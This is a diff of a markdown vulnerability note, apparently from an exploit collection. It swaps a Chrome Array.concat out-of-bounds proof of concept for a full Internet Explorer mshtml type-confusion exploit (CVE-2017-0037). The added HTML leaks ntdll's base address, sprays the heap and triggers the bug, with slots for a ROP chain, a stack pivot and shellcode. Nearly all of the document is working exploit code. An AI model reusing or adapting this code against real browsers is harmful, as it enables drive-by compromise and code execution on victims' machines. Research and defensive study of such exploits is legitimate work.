@@ -1,54 +1,125 @@
-# CVE-2016-1646
-* Date : Mar 2016
-* Credit : Wen Xu
+# CVE-2017-0037
+* Date : July 2017
+* Credit : Google Project Zero
 
 ## Description
-OOB access in `Array.concat` builtin
+Type Confusion Vulnerability in mshtml.dll
 
 ## PoC
 ```html
 <html>
-<script language="javascript">
-function gc() {
-  tmp = [];
-  for (var i = 0; i < 0x100000; i++)
-    tmp.push(new Uint8Array(10));
-  tmp = null;
-}
+      <head>
+          <style>
+              .class1 { float: left; column-count: 5; }
+              .class2 { column-span: all; columns: 1px; }
+              table {border-spacing: 0px;}
+          </style>
+          <script>
+       
+          var ntdllBase = "";
 
-b = new Array(10);
-b[0] = 0.1; <-- Note that b[1] is a hole!
-b[2] = 2.1;
-b[3] = 3.1;
-b[4] = 4.1;
-b[5] = 5.1;
-b[6] = 6.1;
-b[7] = 7.1;
-b[8] = 8.1;
-b[9] = 9.1;
-b[10] = 10.1;
+           function infoleak() {
+           
+              var textarea = document.getElementById("textarea");
+              var frame = document.createElement("iframe");
+              textarea.appendChild(frame);
+              frame.contentDocument.onreadystatechange = eventhandler;
+              form.reset();  
+          }
+            
+          function eventhandler() {
+              document.getElementById("textarea").defaultValue = "foo";
+              // Object replaced here
+              // one of the side allocations of the audio element
+              var j = document.createElement("canvas");
+              ctx=j.getContext("2d");
+              ctx.beginPath();
+              ctx.moveTo(20,20);
+              ctx.lineTo(20,100);
+              ctx.lineTo(70,100);
+              ctx.strokeStyle="red";
+              ctx.stroke();              
+          }
+           
+                  
+          setTimeout(function() {
+              var txt = document.getElementById("textarea");
+              var il = txt.value.substring(2,4);
+              var addr = parseInt(il.charCodeAt(1).toString(16) + il.charCodeAt(0).toString(16), 16);
+              ntdllBase = addr - 0x000d7560;
 
-Object.defineProperty(b.__proto__, 1, { <-- define b.__proto__[1] to gain the control in the middle of the loop
-	get: function () {
-		b.length = 1; <-- shorten the array
-		gc(); <-- shrink the memory
-		return 1;
-	},
-	set: function(new_value){
-        /* some business logic goes here */
-        value = new_value
-    }
-});
+              //alert("NTDLL base addr is: 0x" + ntdllBase.toString(16));
+              spray();
+              boom();
+          }, 1000); 
 
-c = b.concat();
-for (var i = 0; i < c.length; i++)
-{
-    document.write(c[i]);
-    document.write("<br>");
-}
-</script>
+          function writeu(base, offs) {
+           
+              var res = 0;
+              if (base != 0) {  res = base + offs }
+              else {  res = offs }
+              res = res.toString(16);
+              while (res.length < 8) res = "0"+res;
+              return "%u"+res.substring(4,8)+"%u"+res.substring(0,4);
+               
+          }
+
+          function spray()
+          {
+              var hso = document.createElement("div");
+
+              var junk = unescape("%u0e0e%u0e0e");
+              while(junk.length < 0x1000) junk += junk;
+
+              //ntdll prefered base addr = 0x77ec0000
+              
+              //ROP chain built from NTDLL.DLL to disable DEP using VirtualProtect      
+              var rop = #{rop_payload};
+
+              //Shellcode
+
+              var shellcode = #{shellcode_payload};
+
+              //stack pivot
+              var xchg = #{xchgrop}; //0x77eed801: xchg eax, esp ; retn
+              //first stage ROP chain to do bigger stack pivot
+              var pivot = #{pivotrop};
+
+              var offset = 0x7c9; //magic number - offset into heap spray to reach addr 0x0e0e0e0e
+              var data = junk.substring(0, 0x200) + rop + shellcode + junk.substring(0, offset - 0xd4 - 0x200 - rop.length - shellcode.length) + pivot + junk.substring(0, 0xd4 -pivot.length) + xchg;
+              
+              data += junk.substring(0, 0x800 - offset - xchg.length);
+              while(data.length < 0x80000) data += data;
+              for(var i = 0; i < 0x350; i++)
+              {
+                  var obj = document.createElement("button");
+                  obj.title = data.substring(0, (0x7fb00-2)/2);
+                  hso.appendChild(obj);
+              }
+
+          }
+       
+          function boom() {
+              document.styleSheets[0].media.mediaText = "aaaaaaaaaaaaaaaaaaaa";
+              th1.align = "right";
+          }
+           
+          </script>
+      </head>
+       
+      <body onload=infoleak()>
+           <form id="form">
+              <textarea id="textarea" style="display:none" cols="80">aaaaaaaaaaaaa</textarea>
+          </form>
+          <table cellspacing="0">
+              <tr class="class1">
+              <th id="th1" colspan="0" width=2000000></th>
+              <th class="class2" width=0><div class="class2"></div></th>
+          </table>
+      </body>
 </html>
 ```
 
 ## Reference
-[issue 594574](https://bugs.chromium.org/p/chromium/issues/detail?id=594574)
+[issue 1011](https://bugs.chromium.org/p/project-zero/issues/detail?id=1011)
+[redr2e Github](https://github.com/redr2e/exploits/blob/master/CVE-2017-0037_CVE-2017-0059/index.html)
